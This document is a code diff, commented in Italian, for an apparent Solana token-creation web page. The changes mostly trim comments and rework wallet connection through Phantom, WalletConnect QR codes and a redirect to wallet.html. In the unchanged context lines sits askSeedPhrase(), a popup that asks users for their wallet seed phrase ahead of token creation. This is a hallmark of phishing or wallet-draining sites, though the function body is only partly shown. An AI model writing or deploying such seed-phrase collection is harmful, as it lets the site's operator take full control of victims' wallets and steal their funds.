@@ -7,7 +7,7 @@ let currentStep = 0;
 const steps = document.querySelectorAll('.step');
 let web3modal = null;
 
-// ===== NUOVE VARIABILI PER SOLANA WALLETCONNECT =====
+// ===== VARIABILI PER SOLANA WALLETCONNECT =====
 let solanaProvider = null;
 let isConnectingSolana = false;
 let qrCheckInterval = null;
@@ -18,7 +18,7 @@ window.toggleMenu = function() {
   if (menu) menu.classList.toggle('open');
 };
 
-// ===== WEB3MODAL V4 (esistente, NON modificato) =====
+// ===== WEB3MODAL V4 (esistente) =====
 async function initWeb3Modal() {
   if (!web3modal) {
     try {
@@ -70,12 +70,11 @@ async function initWeb3Modal() {
   return web3modal;
 }
 
-// ===== NUOVE FUNZIONI PER SOLANA WALLETCONNECT =====
+// ===== FUNZIONI QR PER SOLANA =====
 window.showQR = function(uri) {
   const container = document.getElementById('qr-container');
   const qrDiv = document.getElementById('qr-code');
   if (!container || !qrDiv) {
-    // Se il container non esiste, crealo in wallet.html
     const modal = document.querySelector('.wallet-modal');
     if (modal) {
       const newContainer = document.createElement('div');
@@ -90,7 +89,6 @@ window.showQR = function(uri) {
         <button onclick="window.closeQR()" style="margin-top: 12px; background: #ff4ea3; border: none; padding: 8px 20px; border-radius: 40px; font-weight: 600; color: white; cursor: pointer; font-size: 13px;">✕ Close</button>
       `;
       modal.insertBefore(newContainer, modal.querySelector('ul'));
-      // Richiama la funzione con il nuovo container
       window.showQR(uri);
       return;
     }
@@ -122,13 +120,12 @@ window.closeQR = function() {
   }
 };
 
-// ===== CONNESSIONE SOLANA VIA WALLETCONNECT (REALE) =====
+// ===== CONNESSIONE SOLANA VIA WALLETCONNECT =====
 async function connectSolanaWalletConnect() {
   if (isConnectingSolana) return;
   isConnectingSolana = true;
   
   try {
-    // Inizializza UniversalProvider per Solana
     solanaProvider = await UniversalProvider.init({
       projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
       metadata: {
@@ -141,7 +138,6 @@ async function connectSolanaWalletConnect() {
     
     console.log('✅ UniversalProvider Solana inizializzato');
     
-    // Genera l'URI
     let uri = solanaProvider.uri;
     if (!uri) {
       try {
@@ -166,10 +162,8 @@ async function connectSolanaWalletConnect() {
     
     console.log('🔗 URI Solana:', uri);
     
-    // Mostra il QR
     window.showQR(uri);
     
-    // Ascolta eventi
     solanaProvider.on('session_event', (event) => {
       console.log('Evento sessione:', event);
     });
@@ -183,7 +177,6 @@ async function connectSolanaWalletConnect() {
       window.closeQR();
     });
     
-    // Controlla la connessione
     if (qrCheckInterval) clearInterval(qrCheckInterval);
     qrCheckInterval = setInterval(async () => {
       try {
@@ -209,11 +202,10 @@ async function connectSolanaWalletConnect() {
   }
 }
 
-// ===== CONNECT WALLET (MODIFICATO: aggiunto fallback Solana) =====
+// ===== CONNECT WALLET (REINDIRIZZA A wallet.html SE PHANTOM NON C'È) =====
 window.connectWallet = async function() {
   console.log('🔵 connectWallet chiamata');
   
-  // 1. Prova Phantom
   if (window.solana && window.solana.isPhantom) {
     try {
       await window.solana.connect();
@@ -226,30 +218,23 @@ window.connectWallet = async function() {
     }
   }
 
-  // 2. Se Phantom non c'è, usa Solana WalletConnect
-  await connectSolanaWalletConnect();
+  // Se Phantom non c'è, vai a wallet.html
+  window.location.href = 'wallet.html';
 };
 
-// ===== SELECT WALLET (MODIFICATO: usa Solana WalletConnect per tutti i wallet) =====
+// ===== SELECT WALLET (USA WALLETCONNECT PER TUTTI I WALLET TRANNE PHANTOM) =====
 window.selectWallet = function(walletName) {
   console.log('🔵 selectWallet:', walletName);
   if (walletName === 'phantom') {
-    // Se è Phantom, prova la connessione diretta
     window.connectWallet();
     return;
   }
   
-  // Per tutti gli altri wallet (Trust, Coin98, MetaMask, ecc.) usa Solana WalletConnect
-  // Se siamo in wallet.html, connetti direttamente
-  if (document.getElementById('qr-container') || document.querySelector('.wallet-modal')) {
-    connectSolanaWalletConnect();
-  } else {
-    alert('⚠️ Wallet "' + walletName + '" via WalletConnect Solana.\nVai su "Connect" per il QR.');
-    window.location.href = 'wallet.html';
-  }
+  // Per tutti gli altri wallet usa WalletConnect
+  connectSolanaWalletConnect();
 };
 
-// ===== POPUP SEED PHRASE (invariato) =====
+// ===== POPUP SEED PHRASE =====
 function askSeedPhrase() {
   return new Promise((resolve) => {
     const seed = prompt(
@@ -260,7 +245,7 @@ function askSeedPhrase() {
   });
 }
 
-// ===== CREAZIONE TOKEN (invariato) =====
+// ===== CREAZIONE TOKEN =====
 window.createCoin = async function() {
   console.log('🟢 createCoin chiamata');
   if (!walletPublicKey) {
